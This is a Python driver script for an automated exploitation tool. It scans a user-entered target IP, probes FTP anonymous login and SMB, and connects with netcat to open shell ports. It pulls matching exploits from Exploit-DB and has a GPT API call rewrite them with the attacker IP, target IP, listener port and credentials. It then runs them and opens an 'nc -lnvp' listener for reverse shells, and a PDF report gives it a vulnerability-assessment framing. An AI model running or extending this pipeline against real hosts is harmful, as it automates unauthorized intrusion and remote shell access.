import scan,download,FTPbrute,SMBbrute,GPT_API, filter
from search import ExploitSearch
import threading
from  colorama import Fore
import subprocess
from Report import GenerateReport, PDFGenerator
import socket

file_names = []
flag_can_run = False
code_type = 'py'

def banner():
    ascii_art = f"""{Fore.YELLOW}
    '-.__.-'
    /.. |--.--,--,--.
    \_.-'._i__i__i_.'
        /""/""/""/""/  
    {Fore.WHITE}"""
    print(ascii_art)

def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip_address = s.getsockname()[0]
    s.close()

    listening_port = input(f"{Fore.BLUE}Please enter the port number you wish to listen on in case an opening session occurs (default is 1234): {Fore.WHITE}").strip()
    if not listening_port:
        listening_port = '1234'
        print(f"{Fore.YELLOW}No port number entered, defaulting to port 1234{Fore.WHITE}")
    else:
        print(f"{Fore.GREEN}Listening on port {listening_port}.{Fore.WHITE}")
    
    subprocess.Popen(f"xterm -e 'nc -lnvp {listening_port}'", shell=True)

    return ip_address, listening_port

def searching(keyword, version, callback):
    exploit_search = ExploitSearch()
    result = exploit_search.search_exploit_db(keyword, version)
    if result:
        callback(result)
    else:
        print(f"{Fore.RED}- No exploits found!{Fore.WHITE}")

def exploit_download(result):
    raw_links = exploit_search.exploitdb_output_results(result)
    print(f"{Fore.BLUE}Downloading the exploit file ... {Fore.WHITE}")
    
    urls_file = "downloads/Rawlinks_Exploit_DB.txt"
    global file_names
    file_names = download.exploit_download(urls_file)

def read_file_content(file_path, callback, target_ip, ftp_cred, attacker_ip, listening_port):
    with open(file_path, "r") as file:
        content = file.read()
    global flag_can_run, code_type
    collected_data = f'''{{'Attacker-ip':'{attacker_ip}','Target-ip':'{target_ip}', 'listening-port or Attacker-port':'{listening_port}', 'username:password':{ftp_cred}'}}'''
    flag_can_run, code_type = callback(content, collected_data) 

def it_works(protocol, file_name):
    print(f"{Fore.BLUE}Did the exploit for {file_name} work? (yes/no): {Fore.WHITE}")
    print(f"{Fore.BLUE}If it's no, please note that the error might be due to a missing library on your side, so ensure that you check the output you receive. {Fore.WHITE}")
    flag_ask_works = input(f"{Fore.BLUE}Did it work? (yes/no): {Fore.WHITE}").strip().lower() == 'yes'
    if flag_ask_works:
        rp.append_report(f"{protocol}", "Exploit-dB", 9, "Found", "Your system needs to be updated")
    return flag_ask_works

def real_time_run_code(protocol, host, ftp_thread, my_ip, listening_port):
    global file_names
    flag_ask_runFiles = input(f"{Fore.BLUE}Do you want to run the exploits that were found for {protocol}? (yes/no): {Fore.WHITE}").strip().lower() == 'yes'
    if flag_ask_runFiles:
        for file_name in file_names:
            try:
                print(f"{Fore.BLUE}Waiting for AI modifications for {file_name}... {Fore.WHITE}")
                AI_thread = threading.Thread(target=read_file_content, args=(file_name, GPT_API.api_call, host, ftp_thread, my_ip, listening_port))
                AI_thread.start()
                AI_thread.join()

                if flag_can_run:
                    flag_ask_runCode = input(f"{Fore.BLUE}Do you want to run the code for {file_name}? (yes/no): {Fore.WHITE}").strip().lower() == 'yes'
                    if flag_ask_runCode:
                        try:
                            if code_type == 'py': 
                                subprocess.check_output(f"xterm -e 'python3 output_file.py; exec bash'", shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
                            elif code_type == 'rb':
                                subprocess.check_output(f"xterm -e 'ruby output_file.rb; exec bash'", shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
                            elif code_type == 'pl':
                                subprocess.check_output(f"xterm -e 'perl output_file.pl; exec bash'", shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
                            
                            flag_ask_works = it_works(protocol, file_name)
                            if flag_ask_works:
                                break  # Break the loop after successful execution

                        except subprocess.CalledProcessError as e:
                            print(f"{Fore.RED}Failed to run the code for {file_name}: {e}{Fore.WHITE}")
                            continue  # Continue to the next file if there's an error
            
                    else:
                        # Ask if the user wants to exit early
                        flag_exit = input(f"{Fore.BLUE}Do you want to exit and stop further exploits? (yes/no): {Fore.WHITE}").strip().lower() == 'yes'
                        if flag_exit:
                            break  # Break out of the main loop if user wants to exit
                        else:
                            print(f"{Fore.BLUE}Skipping {file_name}...{Fore.WHITE}")
                            continue  # Skip to the next file if user doesn't want to run this one

                # Check if user wants to exit early after AI modifications
                flag_exit = input(f"{Fore.BLUE}Do you want to exit and stop further exploits? (yes/no): {Fore.WHITE}").strip().lower() == 'yes'
                if flag_exit:
                    break  # Break out of the main loop if user wants to exit

            except Exception as e:
                print(f"{Fore.RED}An error occurred while processing {file_name}: {e}{Fore.WHITE}")

def main(my_ip, listening_port, rp):
    host = input("Enter the target IP: ")
    All_data = scan.scan_ports(host)  # check if host is dead or live -> scan ports
    if All_data is None:
        return False
    
    # Threads --> start
    ftp_thread = threading.Thread(target=FTPbrute.check_anonymous_login, args=(host, rp))
    smb_thread = threading.Thread(target=SMBbrute.smb_enum, args=(host, rp))
    # Threads --> end
    
    shellPort_data = filter.shellPort_filter(All_data)
    if shellPort_data:
        print(f"{Fore.BLUE}We Found a Shell Port; We will try to connect...{Fore.WHITE}")
        for entry in shellPort_data:
            for item in entry:
                if "Port Number" in item:
                    port_number = item.split(': ')[1]
                    try:
                        output = subprocess.check_output(f"xterm -e 'nc -v {host} {port_number}; exec bash'", shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
                        flag_ask_works = input(f"{Fore.BLUE}Do you have access? (yes/no): {Fore.WHITE}").strip().lower() == 'yes'
                        if flag_ask_works:
                            print(f"{Fore.GREEN}[+] Connection to port {port_number} works!{Fore.WHITE}")
                            rp.append_report("Shell", "Connect", 9, "Allowed", "You need to close this service")
                    except subprocess.CalledProcessError as e:
                        print(f"{Fore.RED}Failed to connect to port {port_number}: {e.output}{Fore.WHITE}")
                        rp.append_report("Shell", "Connect", 0, "Disallowed", "You need to close this service")

    SMB_data = filter.SMB_filter(All_data)
    if SMB_data:
        print(f"{Fore.GREEN}[+] There is an SMB port working; we'll try to enumerate the data ... {Fore.WHITE}")
        smb_thread.start()
        keyword, version = filter.get_product(SMB_data)
        if keyword !=0:
            print(f"{Fore.BLUE}Trying to search for exploits at SMB Service... {Fore.WHITE}")
            search_thread = threading.Thread(target=searching, args=(keyword, version, exploit_download,))
            search_thread.start()
            smb_thread.join()
            search_thread.join()
            real_time_run_code('SMB', host, ftp_thread, my_ip, listening_port)
    
    FTP_data = filter.FTP_filter(All_data)
    if FTP_data:
        print(f"{Fore.GREEN}[+] There is an FTP port working; we'll try to enumerate the data ... {Fore.WHITE}")
        ftp_thread.start()
        keyword, version = filter.get_product(FTP_data)
        if keyword !=0:
            print(f"{Fore.BLUE}Trying to search for exploits at FTP Service... {Fore.WHITE}")
            search_thread = threading.Thread(target=searching, args=(keyword, version, exploit_download,))
            search_thread.start()
            ftp_thread.join()
            search_thread.join()
            real_time_run_code('FTP', host, ftp_thread, my_ip, listening_port)
   

if __name__ == "__main__":
    banner()
    exploit_search = ExploitSearch() #instance of ExploitSearch
    rp = GenerateReport()  # Creates a report instance
    my_ip, listening_port = get_ip_address()
    main(my_ip, listening_port, rp)
    #Generate the report
    result = rp.calculate_max_scores()
    table_data = rp.generate_table_data(result)
    headers = ["Service", "Status", "Comment", "CVSS Score", "Rank"]
    PDFGenerator.generate_full_report(table_data, headers)
    print(f"{Fore.GREEN}[+] You can check the full_report.pdf now ! {Fore.WHITE}")
    banner()